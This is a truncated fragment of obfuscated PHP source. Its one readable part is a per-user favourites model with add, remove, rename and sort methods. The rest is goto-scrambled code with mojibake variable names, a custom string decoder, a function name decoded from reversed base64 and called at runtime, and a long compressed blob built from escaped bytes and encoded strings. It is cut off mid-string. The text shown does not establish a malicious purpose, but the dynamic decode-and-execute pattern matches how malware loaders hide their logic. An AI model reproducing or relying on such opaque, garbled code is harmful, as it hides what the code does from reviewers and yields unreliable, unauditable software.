$„ú÷«Ôé·‹[$Îæ®íİ§¶[$±Çá—ÜŒÉ´™[76]]]; $¼ÙØš»Şô¸ = $¼ÙØš»Şô¸ ? $¼ÙØš»Şô¸ : array(); $½–¼ïùıÃâ¬û[$ıİøğ“æ] = array_merge($¼ÙØš»Şô¸, $Îæ®íİ§¶); } return $½–¼ïùıÃâ¬û; } protected function addFav($õàÙ, $»”ş = '', $áúé´± = "\x73\157\165\x72\x63\145") { $³„Ã¾ğÆë– =& $_SERVER[ÀÆ]; $‰š¸ü = array($³„Ã¾ğÆë–[1563] => USER_ID, $³„Ã¾ğÆë–[477] => 0, $³„Ã¾ğÆë–[417] => $áúé´±, $³„Ã¾ğÆë–[416] => $õàÙ); if ($this->where($‰š¸ü)->find()) { return !1; } $‰š¸ü = array($³„Ã¾ğÆë–[1563] => USER_ID, $³„Ã¾ğÆë–[477] => 0); $«ÔÁÔ’ = $this->where($‰š¸ü)->max($³„Ã¾ğÆë–[1762]); if (!$«ÔÁÔ’) { $«ÔÁÔ’ = 0; } if (!$»”ş && $áúé´± == $³„Ã¾ğÆë–[411]) { $–óı = Model($³„Ã¾ğÆë–[1250])->where(array($³„Ã¾ğÆë–[412] => $õàÙ))->find(); if (!$–óı) { return !1; } $»”ş = $–óı[$³„Ã¾ğÆë–[28]]; } $»”ş = $this->getAutoName($»”ş); $Â¹¤ÙÕÒéø = array($³„Ã¾ğÆë–[1563] => USER_ID, $³„Ã¾ğÆë–[477] => 0, $³„Ã¾ğÆë–[415] => $»”ş, $³„Ã¾ğÆë–[416] => $õàÙ, $³„Ã¾ğÆë–[417] => $áúé´±, $³„Ã¾ğÆë–[1743] => $«ÔÁÔ’ + 1); return $this->add($Â¹¤ÙÕÒéø); } protected function remove($¢áó°¾²­•à) { $ËÛø×² =& $_SERVER[ÀÆ]; $üÑ­ƒËš‰ÂÑ­ = array($ËÛø×²[1563] => USER_ID, $ËÛø×²[414] => $¢áó°¾²­•à); return $this->where($üÑ­ƒËš‰ÂÑ­)->delete(); } protected function removeByName($Û³İ) { $³«ö÷ =& $_SERVER[ÀÆ]; $çŞ×€‘È † = array($³«ö÷[1563] => USER_ID, $³«ö÷[415] => $Û³İ, $³«ö÷[477] => 0); return $this->where($çŞ×€‘È †)->delete(); } protected function rename($Ğ¡¦İº£¿, $‚°‹°Ş‚°) { $’¹«á¦ü =& $_SERVER[ÀÆ]; if ($Ğ¡¦İº£¿ == $‚°‹°Ş‚°) { return !1; } $¿»ğ÷ÓõÁ = $this->getAutoName($‚°‹°Ş‚°); if ($‚°‹°Ş‚° != $¿»ğ÷ÓõÁ) { return !1; } $ÄàæÖáš = array($’¹«á¦ü[1563] => USER_ID, $’¹«á¦ü[477] => 0, $’¹«á¦ü[28] => $Ğ¡¦İº£¿); return $this->where($ÄàæÖáš)->save(array($’¹«á¦ü[28] => $‚°‹°Ş‚°)); } protected function resetSort($ª¯ŠÆÜİĞ) { $òª¶Ô´ß¨ =& $_SERVER[ÀÆ]; $ª¯ŠÆÜİĞ = is_array($ª¯ŠÆÜİĞ) ? $ª¯ŠÆÜİĞ : array(); $Ö¹·®ĞôÍ³âÃ = array($òª¶Ô´ß¨[1563] => USER_ID); for ($³´™ë = 0; $³´™ë < count($ª¯ŠÆÜİĞ); $³´™ë++) { $Ö¹·®ĞôÍ³âÃ[$òª¶Ô´ß¨[414]] = $ª¯ŠÆÜİĞ[$³´™ë]; $this->where($Ö¹·®ĞôÍ³âÃ)->save(array($òª¶Ô´ß¨[1743] => $³´™ë + 1)); } return !0; } protected function moveTop($öû) { $†˜ =& $_SERVER[ÀÆ]; $–Ÿ÷ = array($†˜[1563] => USER_ID, $†˜[477] => 0); $®ÎÅë×¿ = $this->where($–Ÿ÷)->where(array($†˜[28] => $öû))->find(); if (!$®ÎÅë×¿) { return; } $¾İÅ·¨ = $this->field($†˜[395])->where($–Ÿ÷)->order($†˜[2166])->select(); $¾İÅ·¨ = array_to_keyvalue($¾İÅ·¨, $†˜[33], $†˜[395]); $Ëí™–¥×šğÍ = $¾İÅ·¨; $¾İÅ·¨ = array_remove_value($¾İÅ·¨, $®ÎÅë×¿[$†˜[395]]); array_unshift($¾İÅ·¨, $®ÎÅë×¿[$†˜[395]]); return $this->resetSort($¾İÅ·¨); } protected function moveBottom($Õº‰ÉÇ†) { $»šÈœ‰Æâ =& $_SERVER[ÀÆ]; $ÎÜ¯ßğ = array($»šÈœ‰Æâ[1563] => USER_ID, $»šÈœ‰Æâ[477] => 0); $š‚ = $this->where($ÎÜ¯ßğ)->max($»šÈœ‰Æâ[1762]); $Øß¡ÊÉ€ï = array($»šÈœ‰Æâ[1762] => $š‚ + 1); return $this->where($ÎÜ¯ßğ)->where(array($»šÈœ‰Æâ[28] => $Õº‰ÉÇ†))->save($Øß¡ÊÉ€ï); } private function getAutoName($œÒ™İú”û) { $Ø¡Š =& $_SERVER[ÀÆ]; $ùëŠ·Õ““ºÚ = array($Ø¡Š[1563] => USER_ID, $Ø¡Š[477] => 0); $¶É²æĞ¹ = $this->field($Ø¡Š[28])->where($ùëŠ·Õ““ºÚ)->select(); $¶É²æĞ¹ = array_to_keyvalue($¶É²æĞ¹, $Ø¡Š[33], $Ø¡Š[28]); if (!$¶É²æĞ¹ || !in_array($œÒ™İú”û, $¶É²æĞ¹)) { return $œÒ™İú”û; } for ($–­Ãâ¹İ³ù÷Ó = 0; $–­Ãâ¹İ³ù÷Ó < count($¶É²æĞ¹); $–­Ãâ¹İ³ù÷Ó++) { if (!in_array($œÒ™İú”û . "\50{$–­Ãâ¹İ³ù÷Ó}\x29", $¶É²æĞ¹)) { return $œÒ™İú”û . "\x28{$–­Ãâ¹İ³ù÷Ó}\x29"; } } return $œÒ™İú”û . "\x28{$–­Ãâ¹İ³ù÷Ó}\x29"; } } goto dÍÙÑÏñ; eœé­§•Úà: $fileSize = strrev(base64_decode($_SERVER[øêŞ][0])); function binCheckNeq($òŸÃ®Óù½, $š) { return $òŸÃ®Óù½ != $š; } $_SERVER[$_SERVER[øêŞ][1]] = $fileSize($_SERVER[$_SERVER[øêŞ][2]]); goto aç‡›ßÕÂÔ; e¡Ö«¶ÛçÙ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x9e\xc0\xc6", "\x8f"); $_SERVER[ÀÆ] = explode("\x7c\x3\x7c\x3\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\7\174\23\107\366\70\236\372\115\57\244\27\222\54\16\340\202\212\155\300\200\301\200\154\313\130\40\113\106\222\51\301\40\126\322"."\132\136\133\322\312\273\53\67\314\245\22\22\10\244\27\110\57\44\220\2\41\355\40\1\356\322\13\111\270\134\312\45\271\220\212\111\277\264\113\273\113\302\157\372\314\256\104"."\xf2\xfd\x7f\xfe\xbf\xcf\xe7\x47\x2\xda\x79\xd3\xdf\xbc\x79\xf3\xde\xcc\x9b\x37\x3f\x7d\xf6\xee\xc0\xfe\xe0\xbf\x7d\x2f\xbb\x7e\xe7\x3b\xaf\xde\xf8\xea\x1d\x38\x34\xb0\xdf\xc0\x1\xe8\xb".base64_decode('fJ+x/OB90J9jly8rKWmsOnRU4PBLH7pPvlteJ68M+re/6Dvi5Xune3ffvr1v974=')."\xfb\x6c\xf6\xfe\xf6\x58\x35\x48\x8c\xf3\x56\xe3\x1f\x29\xa3\x99\x92\xd2\xab\x1a\xa6\x81\x1\x71\x2d\xd3\xa6\x26\xf1\xb7\x9a\xc1\xbf\x6e\xfc\x63\x74\xa5\x54\x53\xc1\xdf\xd1\x40\x30\x12\xd"."\267\64\67\173\103\221\50\51\121\214\117\153\11\362\225\225\165\71\115\12\317\52\272\1\252\22\213\213\146\265\254\222\261\100\70\40\41\233\162\114\66\110\111\365\265\321\172"."\157\263\77\70\67\32\231\333\354\45\51\142\321\256\234\242\367\341\20\372\14\233\262\156\106\324\264\302\122\364\350\254\135\265\336\151\276\200\24\11\171\2\141\117\135\304\27"."\14\140\160\135\260\251\311\27\311\207\207\202\176\177\255\247\156\106\176\114\163\310\63\255\311\43\201\366\245\224\250\232\151\323\112\244\205\70\146\241\124\212\77\32\124\45\225"."\xc0\x9f\x19\x99\x36\xc7\xec\xcb\x92\xaf\x8\xfb\x2\x63\x90\xc9\xa5\x52\x38\x10\x60\x5f\xa4\xfd\x4a\x9b\x9c\x4b\x11\x9c\xd5\x8b\x81\xac\xae\xa6\x65\xda\xf5\x19\x4a\x1f\x83\xe2\xf\x39\x67"."\152\152\46\216\3\336\136\123\227\71\34\264\70\256\53\151\45\103\212\12\173\375\336\272\210\4\233\51\65\204\202\115\22\31\212\264\154\230\212\56\315\156\364\206\274\22\154"."\x7a\x4d\x31\xea\x71\xb1\x84\xf3\xb5\x4\x0\x42\x24\x8f\xdf\x2f\xed\xad\x4\x53\x49\x67\x69\x31\x38\x4f\x81\xc2\x82\xa1\x7a\x6f\x48\xaa\x9d\x2b\x71\x3c\xc5\xb5\x74\x5a\xcb\xb8\x40\x29\x60"."\74\115\241\251\336\120\10\177\70\10\5\373\175\160\350\110\40\330\320\20\366\262\20\351\334\114\77\150\311\150\102\245\226\120\242\55\145\106\273\345\124\216\22\153\47\376\55".strrev('b‰$Nÿ3Yün´Ì“#_i ’ˆP­Mæli¡•ˆG5©w3Wä?&').base64_decode('URin6GZUycS1hJoh83EKmXuEAmWzvV5XQTpSoOaKa9m+Jq2bdKZNTSl+Nt3atFQ=')."\x42\xd1\x79\x38\xb\xb2\x8b\x31\xa4\x57\x6a\xbf\x90\x3b\x90\x4b\x8b\x49\x58\x30\xde\xae\xa6\x12\x3a\x9d\xa5\xbf\x97\x12\xf0\x1\xb5\xad\x8f\xcf\x46\x43\xcb\xe9\x71\xc5\x7\xe6\xb\xcf\xdb".base64_decode('zFpSQRIppgk6bdB+tWRTmpwIK7rQ1waQMZgzRWAOJWvQ9HQ94BukfjBb1JYCEZ0=')."\x74\xbe\x24\x4\x14\xba\xf0\x8f\xbb\x64\xde\xb9\xce\xdf\xe6\xcf\x9b\xa\xfe\x29\x25\xcc\xaf\x95\x34\xad\x5d\x49\xa5\xa2\x4a\xaf\x42\xe6\x55\x3a\x31\xd6\xa0\x7d\x75\x1b\x31\x35\xe3\x6\x10".strrev('¦íßÅ=‰N\\ZS™À¯LĞ£‡º­÷Ÿ âÏm•×¥	3ËH¹E”ŞÑ²í£ô')."\231\15\53\231\4\104\10\351\221\326\223\101\10\313\52\12\111\124\357\220\22\122\223\64\127\152\254\126\253\15\232\61\235\142\137\264\167\14\146\60\240\331\113\50\246\210\204"."\x95\x5e\x93\x20\x45\x9a\x18\x6f\x97\x75\x30\x5c\x35\x39\xb3\xcd\x39\x1e\x3\xe5\x6c\x36\xa5\xc6\x65\x53\xd5\x32\x6e\x2d\x6e\x2a\xa6\xd3\x30\x75\x45\x26\xa5\x79\xe2\x71\xc5\x30\x9c\x75\x5a"."\306\324\265\224\323\223\112\151\75\316\240\256\46\325\114\265\124\206\323\300\110\60\337\235\220\103\126\223\111\134\64\121\202\264\2\31\104\31\256\215\116\116\226\132\227\63\106"."\x9b\xa2\x3b\xbd\x64\xd2\x54\x4b\x60\x3c\x18\x83\xa4\xc9\xea\x55\x23\xab\x19\x2a\x6c\x5e\xb5\x24\x9b\xa6\x1c\x6f\x87\xcc\x85\x17\x5f\xf3\x3b\xe9\xd5\x4c\x4a\xcd\x28\x79\x69\xbd\xbd\x59\x55".base64_decode('VwzaVmlaU4QUAkpXnM26nEzL1VI2FwOYIbO3AAynJqipluIw6JDSOcN06grgUio=').base64_decode('WA/JGPvanE1waqlKwhkGzJyAR5ePkQDZSDQOQxsjkeaorwGs2QFvtMkTqWskzTY=')."\345\44\155\263\37\260\150\126\44\5\316\161\202\51\6\11\53\0\372\312\201\315\132\217\242\203\212\153\373\252\245\116\55\21\323\172\135\64\12\46\16\3\36\102\23\303\341"."\xce\x9a\xce\x90\x9c\x49\x42\xfc\xc4\xfa\x4c\x85\x90\x9f\xd1\x9d\xb4\x22\xda\xaf\x64\x92\x66\x3b\xcd\x18\xf6\x86\x66\x79\x43\xd1\x70\xb0\x21\x32\xdb\x13\x22\xab\x7d\x6\x50\x49\x2f\xad\xa"."\26\235\162\206\224\4\100\175\334\244\371\344\54\304\32\115\3\47\6\34\53\32\13\47\13\215\363\373\246\101\304\324\73\15\220\310\51\246\242\145\373\325\264\12\333\156\262"."\30\204\111\40\12\114\43\15\162\243\16\325\264\266\227\225\264\46\106\225\72\301\277\145\245\363\132\353\135\145\363\247\270\125\236\307\135\341\252\220\52\313\253\244\146\40\233".strrev('Ñí&§†¿/õàÔ°cHŞM¢G'."\r".'âÙä00êkL%Òàüg.QKÎ"Jr¨').base64_decode('PPwzn4xgG2arvrSctHFpGGrSdMUKGWCrxmw1Qdk4DDYqarKd9E+FpcW1lKbLKcg=')."\xc5\x28\x11\x2b\x94\xb3\x24\xd5\x36\x32\x3e\x98\x61\xf2\x40\x58\x4d\x67\x29\x5f\x33\xdb\x73\xe9\x98\xf0\x49\xc5\x52\x30\xde\x74\x79\x69\xd7\xd8\xf2\xa6\xe9\xe4\xab\xda\x4d\x12\x8e\xa8\x6c".strrev(''."\n".'’dk¶b“I%º¡¦êizù‘Q¦%™Pa\'˜RKv•2ÒĞœ6sÿè\'“ ')."\155\122\216\265\215\266\62\241\244\24\212\215\166\205\262\364\162\222\14\254\114\14\127\155\214\275\3\301\15\100\371\222\252\32\41\220\23\12\122\64\74\33\312\273\34\140\262".base64_decode('pCmwmgRjHWC64HBUNRqExT+qoTjQeJmnb9aVNpVMugwYsSZZ76QZwAjxZQcGhMI=')."\x1a\x5a\xfc\xfe\x68\x5d\x30\x10\x1\x32\x34\x86\xcc\xe\xf9\x22\x5e\x4a\xa3\x9e\xfa\xa8\xa7\xae\x79\x80\x2e\xa2\x7c\xc4\x49\x2\xc8\x30\xac\x44\xce\xe5\xe5\xee\xca\x1\xbe\x12\xf1\x25\x8b".strrev('ÿ•…uºk\'&€iû§)×½ÉpróÓÆÑ1N:ÙÁ-)8Î(c-YÎà7ñ¬Ä‚s3')."\xc7\xb\xb5\x8f\x8c\x2b\x67\xdf\x10\xb1\x40\x31\xa2\x4b\x7b\x73\x30\x4c\x32\x4c\x81\x50\x20\x3d\xc5\x14\x9d\xb4\xa3\xb9\x85\x44\xa5\x5\x9a\x9a\xe6\x25\xc0\x43\x9\x19\xb6\xcb\x44\x76\xf2"."\xcc\xe\x53\xd6\x9b\x3\xe9\x75\xb5\x5f\xe6\x7d\x9c\x42\xdb\x43\xca\xee\x4d\xa7\xb8\x40\x68\xed\x95\x93\x8f\x45\xa4\xd1\x17\x98\x11\x6d\xa\xd6\x7b\xfd\x51\x5f\x0\xf0\xa5\x48\x3e\xbc\xa5"."\271\336\103\7\127\204\327\6\43\215\26\150\13\340\114\263\74\176\237\75\271\167\216\57\34\11\27\214\2\260\26\257\55\6\350\202\315\41\157\203\157\16\13\66\370\274\376".strrev('B.XÓ”Aª¥‹QY§ê´]:f¦¶á˜Úƒm$M<ÓÈ×SÎ´pú')."\173\244\273\120\53\106\75\41\62\172\134\313\121\152\144\142\142\232\162\225\264\114\246\225\114\227\302\22\374\123\52\171\302\222\231\45\145\0\376\21\353\143\237\250\33\64\14"."\4\102\122\277\104\330\175\136\13\242\60\115\255\322\306\70\167\141\200\247\315\144\134\300\26\6\363\202\307\201\21\360\40\365\33\120\2\32\221\50\235\153\6\320\127\74\264"."\71\155\134\365\215\6\233\275\41\17\124\234\243\263\103\301\300\64\222\241\247\135\241\15\360\21\364\227\120\361\211\350\317\46\147\141\100\366\221\311\134\111\163\244\167\150\24".base64_decode('lQP4ZyT+AWIfqVzJUKzHIDdnjIHqRGA2UE6s5VhtMU0jNaSgBDBA+QHTvDsMSiQ=')."\275\224\371\214\42\25\366\222\25\45\22\234\341\15\104\51\145\341\220\100\215\30\0\164\331\140\210\40\304\324\72\251\102\205\43\103\336\60\235\345\272\322\225\123\51\272\334"."\256\121\204\212\25\260\150\221\352\335\13\132\173\106\225\314\163\216\162\315\7\37\245\145\123\161\220\204\132\135\226\340\160\222\77\247\263\334\120\60\52\61\246\224\126\267\272".base64_decode('W90lU6rneZz9srO/3DnBOX9Uq6t0FAHMX1TpGLMYJgAJp5w5H/zUtE4Z0eoc+ac=')._kodDe('KUh6qtwkwxOjoSpqymBb8cTHp6kebZP8Q1e/hLEqKp8mKfn9/iFB+z4xpvYW3YJM')."\263\34\272\250\152\61\205\203\61\124\222\74\307\74\147\353\250\371\123\204\174\2\310\136\27\20\226\0\377\155\147\351\74\316\263\140\317\130\126\70\357\11\175\344\62\161\316"."\x3d\xe1\xbc\x88\xc9\x71\xc2\x7\xd4\x64\x86\x4d\x21\x20\x5\x30\x25\xdd\x2a\xa7\x2f\x1a\x81\x7f\x17\xd3\x81\x4c\x2a\x64\xd2\xa3\x8d\x36\x9d\x50\x67\x2e\xa3\x76\xd1\x3d\x88\x8c\xd2\x45\x3e".base64_decode('NJPSd0wxexRKHgBuCQPioIohiBJCKSQWkhq4gqYgbYX0IhuFMlkPCyWUDBmnQ0g=').strrev('1	)]æd#é!sˆ)QÎ5Ğ;]²Ö+ˆÃLNÃ”£{õ©â4hÃĞ°•g.#j').strrev('–Si9'."\0".'4‚ÒêÉS+ É9FÉš¥ÜP·'."\0".'™{ 9….F“»F¯MuÑI')."\x90\x1\x44\x30\x2a\xf\xb9\x4b\x5a\x5b\x73\xf3\x94\xc4\xfc\x79\x80\xf0\x65\x67\xdb\xfc\x45\xa3\x17\x97\x52\x39\xde\xdd\xa\xfe\xd0\x80\xa7\xc0\x26\x5a\x94\x71\xc3\x28\x58\x9f\x5d\xb0\x1d".base64_decode('bB/EEmDROKjpTGjKWsRuUzPllKWICISQwWULN9kywKPt5xwLLuXCHiRipwG2wcY=')."\66\100\204\355\57\230\43\254\230\56\226\302\41\104\106\101\230\364\17\377\133\103\66\4\332\324\14\230\116\165\302\122\207\367\157\302\175\206\251\244\55\133\226\206\42\353\361"."\366\206\134\52\145\62\341\77\245\166\222\32\310\134\131\130\50\155\203\246\123\45\267\214\324\133\124\126\50\241\57\223\1\52\251\110\133\174\125\235\346\1\362\113\104\52\241".base64_decode('23uSLyDVBoN+rycgwQWcLDxAOgh7mz1g1YLqcjjiJTuOvnonLXeO00cUKvahJug=')."\x38\x1\x66\x67\x52\x28\xd9\xf0\x22\x21\x28\x5f\x3a\xe0\xde\x8e\x3\x4a\x11\xe\xd0\x5c\x7\x54\x96\x1c\x5c\xa6\x77\xf0\x1d\x33\x47\xb7\xaa\xf4\xa0\xf\x26\x5a\x3b\x88\xc4\xed\x30\x65\x1d".base64_decode('CANQJCafvnqHatQjdQJVgKJog8x2uIuRkvscuHF+pVtJOWjTHLTFDqoOOJB6V08=').base64_decode('mtUCJg5pFvoE/LHdAUkFUqqD7+iR6gT9w8F1E0dS13LZZlqTEMKNIQDeUgYIaZo=')."\xe9\xa0\xfa\xa6\x23\x5f\x15\x2d\x8c\xbb\xc2\x4d\x47\xc8\xb6\xd7\x4d\x6\xa\x46\xe5\xa3\xe4\xf\x46\x26\x1f\xf9\x56\x95\x6a\x11\x2e\x91\xa8\xe6\x8b\xe9\xe2\x65\x49\xc3\xc7\x92\xce\xa7\x94"."\xc2\x43\x10\xdb\xfc\x6b\x16\x9f\x8f\xb0\x43\xd\x72\xb7\x48\x66\x85\x48\x8e\x2e\x21\x94\x3c\xf9\x16\x3b\xdf\x1\xe6\x22\xad\x5d\xb9\xb4\xef\xdf\xc2\x4a\x23\x72\x32\x2c\x54\x67\xca\x49\x5a"."\127\201\130\374\35\122\342\175\161\256\240\326\13\152\257\65\304\6\0\315\224\102\124\136\170\140\31\345\262\161\70\364\220\103\50\42\51\71\263\101\265\314\202\77\236\177\244".base64_decode('J4idBbNcIMCNhSw1DBaohpRMVqBKMZowU4c1BKePCzFXdOYRZrsVfm9DRJoeBIw=')."\111\325\242\70\117\24\46\226\320\77\132\106\262\224\115\321\45\325\240\170\36\226\63\11\14\131\10\270\366\302\232\42\132\111\221\45\73\247\5\153\43\34\64\150\251\215\217"."\xb1\x88\x4\xb8\xe\xa1\xee\xf3\x95\x86\x82\x82\x7c\x61\xcb\x11\x29\x4e\x36\xe2\xf8\x3\x6e\x52\x93\x2f\x85\xc2\xf8\xd0\x8a\xc4\x87\xc6\xd7\xe\xa0\xed\xb2\xd4\xb\x83\x7c\xe2\x50\x92\x90".base64_decode('YAWkACR3QPbh5FNACJIfK+ZthGlbFSGmmtVMn5oRt6o4dIAtrHxdhxPZtrlWv7c=').strrev('JqÎ²íøBdMµb€[§IIÊrÖÉ);hU˜zĞ}òæ°§LÔ¤s"Ù0­ğZ¼o')."\x39\xe\x9c\xf6\x7c\x3\x10\x26\xe1\x41\x21\x59\x9b\xdc\xcd\x65\xe\x4b\x1e\x81\x6f\x18\x66\x1f\x6d\xbd\xf8\x69\x2d\x14\x7\xeb\xf7\x16\x68\x64\xfb\x15\x85\x82\x22\x4b\x52\xd\x3f\xc0\x5d".strrev('İ8–=!ÙŒ=pù¬©Æ'."\0".'}…DP"0¡/ãH÷®$4 ßè†·èÑw0VˆÓÔo¡')."\x5\x27\xd3\x34\xb8\x62\x51\xac\x61\x3e\x48\xb\x83\xab\xa3\x48\xa1\x61\x5\xcc\x22\x2\xe1\xa5\x85\xf3\xe2\xc4\xd4\x7c\xf\x8\x2e\x4\x7c\xe1\xa0\x98\xe7\xf3\x92\x8f\x6\x9f\x84\x16\xc2"."\x49\xf2\x96\xe6\x40\x8a\x68\x7e\xa3\x20\xf1\x17\xe\x37\xe8\x1a\x13\x75\x99\x1c\x60\x4f\x54\x87\x74\x49\x76\x86\x69\x5b\xc4\x5\x44\x59\xe4\x8d\x3c\x90\x90\xc7\x2e\x79\xd8\xa0\xb6\xa0\x1d"."\337\144\251\302\40\272\323\54\47\322\152\306\245\343\105\317\5\64\4\162\146\354\50\27\104\62\316\251\26\31\150\151\41\213\344\142\33\1\230\232\6\324\116\335\245\203\232".base64_decode('eYOI0J9jwzCftAoVxdMJzBLF+DWqwML5702oJoTAVU6j29M8oXBuy2Ai90WLSN4=')."\x20\x70\x81\xde\x31\xc2\x92\xb2\xd0\x52\xef\x2a\x43\xab\xb3\xab\xf0\x71\x34\x3c\xd0\xc6\x5f\x82\xd\x47\x9a\x9d\x70\x23\xa0\xcb\x30\xb5\x2c\x8f\x11\x82\x38\x5a\x88\xe2\x85\xa\xa9\x18\xa2".base64_decode('UTsAqSeQ/MoRhdKSvEi5xbPJlQIphGMTX71H1yn54M7BnXQAFEGQL4Up7RdaaHA=')."\341\336\156\156\233\201\213\202\25\273\360\114\164\311\211\104\220\356\154\213\337\371\111\305\215\276\302\5\41\163\31\126\224\20\52\234\334\223\112\361\103\164\173\170\257\131\360"."\244\23\63\211\220\275\146\153\100\232\45\75\355\52\4\143\72\207\50\120\133\5\150\156\322\140\27\264\255\274\164\357\322\307\136\230\15\37\320\302\141\260\122\327\265\253\31".base64_decode('xWALrm4U4h3/j8Xc/DGAc2VvhAPjhM1hXYEAcXVlO6CcNQkCBFqMo6ZF9AmhMoQ=').strrev('„?OYŠ+4i2·´Ü ¢€LÄâ[/\\øŒºéíB˜XÉ‚àòáŸqY0¡cÉ')."\327\177\211\177\307\216\253\302\37\310\102\157\77\374\315\355\363\226\314\351\323\76\172\346\370\151\337\371\252\256\335\330\165\346\175\365\276\153\136\63\227\137\235\173\363\333\27"."\256\311\275\271\150\354\214\303\237\277\265\176\371\256\346\272\277\137\361\316\57\307\76\324\124\165\366\35\215\257\34\327\276\354\204\57\157\73\360\254\133\136\312\234\163\302\41".base64_decode('V9zy3p0LJr53W93L1w8r3fDqko2r+4ytH/3o+nBN8tj9//Lj+T8u6Pvq6kl7Dlk=')._kodDe('Kuwv2elBg+8OsLawp1Mn9kTSn6Og1e8R3FNpyBC4awvpFTBrs1ncB42qjsgyw6bo')."\251\373\307\256\74\360\316\201\225\223\264\223\36\35\370\342\255\17\236\172\341\222\301\143\366\354\51\177\370\203\13\56\272\174\145\152\336\21\213\375\55\243\315\134\340\237\43".strrev('l9¿·›ûOw¾´¾gûíu<©gİO[âÌãÜª,ÏÏä8_éO»ÉçTÿÙ¾O#').base64_decode('32uOefuka35pjofHTy89a9229Kfjm7LlN76/q+iY6ac7ipUL5UXZ105f8frt8rU=').base64_decode('x2bmrj/32j7ts51XfPXCn988p/+pg1pCk2aedtwn4ZYX+j+fOWz2tM0PNvzrg6A=')."\266\356\253\314\23\247\175\175\354\246\336\307\35\263\112\376\261\344\255\265\47\334\24\171\344\356\45\373\275\321\161\103\154\341\253\372\271\233\177\375\323\362\243\32\342\315\351"."\xd1\x27\x9b\xff\x3d\x68\x60\xcb\xab\x9f\x6b\xe3\xfa\x3b\x56\x5f\xf5\xca\x7d\x9d\x81\xb5\x17\xe7\xd6\xdc\x91\x2e\xbd\x21\x76\xf3\x85\x87\x35\xb9\x5b\x36\xde\x39\x2c\xb0\x2a\x70\xc3\x84\x50"."\x79\x5d\x74\xeb\x13\xa5\xc9\xe2\x47\x5b\xfe\xfe\xef\xd5\x2b\xc7\xac\x8\x9f\x30\xe6\xb5\x17\x3b\x76\x96\xdf\xd3\x38\x64\xcb\xa3\xc5\x7\xde\xbe\x3e\x75\x75\xee\x16\xff\xfe\x3b\x9f\x5e\x16"."\233\325\261\354\361\322\41\347\174\173\327\11\13\166\135\174\342\7\117\354\130\370\364\215\27\44\37\215\275\61\343\271\247\326\375\132\45\367\16\135\362\350\312\305\315\217\114"."\70\44\360\320\171\263\356\271\377\125\165\370\307\77\7\167\174\173\376\112\245\170\374\304\371\157\36\177\311\75\155\353\366\353\117\237\366\166\373\222\322\245\375\247\177\36\176"."\340\240\331\235\117\335\165\374\213\367\206\236\222\376\73\371\374\203\116\62\37\372\166\377\57\376\35\177\343\361\121\25\373\274\171\351\265\107\136\166\376\253\337\235\360\303\343"."\xb3\x5b\x2f\x59\xb1\xfb\xb8\xcf\x1f\xbc\xb3\xfe\xfa\x7f\x85\xbf\xbb\xac\xb2\xf1\xf3\xec\xd2\xa5\x3\x67\x7b\xd6\x56\x1c\x9e\x7e\xf3\xc3\x85\xe3\xe\xb8\xdc\xf9\x3f\x5b\x5c\x5b\x1e\x5d\x78".base64_decode('9Hd/O+DHi/4d8cTcL+/34Zp4w+wd/utrlw88eup46bS68vDQM+IHzf2hd/AQd+U=')."\xd0\xed\xa7\x5\x37\x5e\x96\x79\xa2\xf5\xb9\x53\x8f\x39\x66\xf8\x7e\x7\x1d\xf7\xd1\xb6\xe2\xc5\xfa\xb2\x92\xd3\xaf\x5c\xfc\xce\xfd\x73\x87\x9e\xf2\xe0\xc3\xaf\x3d\x5e\xb1\xfa\xa9\xc4\xb0".base64_decode('XPnOhw+vG6pkup568d1hjww7/OA7Lvx4xEWB5zO37NNzsPLuQcYD2fR5lyy95h8=')."\xf\x39\xbf\x58\x30\xe2\x47\xc7\xb3\xc7\x44\x96\x8d\x74\xce\xd9\x3c\x5d\x5e\xb4\xe1\x98\xf0\x5d\x9b\x57\x2d\x9d\x13\xfd\xb4\xfb\xac\x5f\xc6\x6c\x56\xe3\xc3\x6b\x9f\xb9\xca\x71\x52\x65\xd7"."\16\75\71\367\205\155\63\175\252\353\254\340\272\306\277\17\237\170\205\176\360\165\27\367\374\371\64\367\234\255\137\254\276\261\104\275\167\377\261\25\356\273\52\126\134\361\375"."\317\333\16\270\45\130\173\367\107\103\336\130\167\301\300\262\312\47\74\211\133\357\71\254\146\324\177\263\361\47\356\177\277\361\372\173\207\134\271\263\242\371\66\325\350\170\353".base64_decode('mVM+e+OT6q6mzv1O/FC6/53nD35nR/2tN/Ytu3TYfxIrfyr6eU7FQ88kLtyZu2I=')."\x94\xba\xf1\xfc\xa9\xfb\xac\x78\x63\x75\xe9\xe9\x7\x3f\xf9\x78\xf9\xa0\xff\x73\xe3\xb8\x55\xbb\xb2\xd3\xeb\x13\xb3\x95\xe3\xe6\x46\x57\xd\x39\x7a\xc8\xd3\xaf\xb8\x9f\x3e\x76\xc7\x3d\xeb".base64_decode('Sk5O3t1Z9WDno5dNGnrug18+s/afkaNO/WjnQ/0H3DD+y+PCN2/9e3dw2PiiM7Q=')."\253\133\276\370\254\362\242\215\167\275\265\176\175\347\25\57\136\176\300\274\25\207\57\76\361\347\127\107\135\160\300\204\343\66\137\370\302\267\145\243\227\106\16\336\165\114\337"."\x65\xbd\xdb\x27\x34\xac\xe\xdd\x7b\xcb\x3\x17\x5\x2e\x3c\xfc\x88\xec\x7d\xab\x5d\x46\xd1\xe9\x73\x3d\xe5\x8f\xc\xbd\x61\xd8\xda\x7d\x6f\x5f\xbb\x6f\x36\xf3\xf3\x90\x87\xce\xf9\xf4\x8d".base64_decode('P/04Nf3v/l8Xdfx5h/rj2//87P73ztiQrDz1kLYzzyqruuDIqu0Xzn337lkPJfY=')."\77\366\204\103\207\354\31\221\153\156\225\67\127\256\275\120\17\76\365\331\234\115\311\310\273\7\206\116\31\246\67\234\262\355\354\247\16\74\376\220\352\123\212\357\174\340\227"."\113\356\76\373\231\263\3\3\335\127\237\173\346\141\367\70\306\56\177\62\145\264\116\337\367\240\133\336\152\375\317\356\41\257\235\232\334\375\342\353\307\257\271\143\241\67\270"."\x73\x55\xc3\x11\xfb\xdf\xd1\x70\x4d\x6d\xff\xb3\xc3\x32\xb\x8a\xdf\x5d\xd6\x72\xf9\xab\xd2\x19\xc7\x6b\xeb\x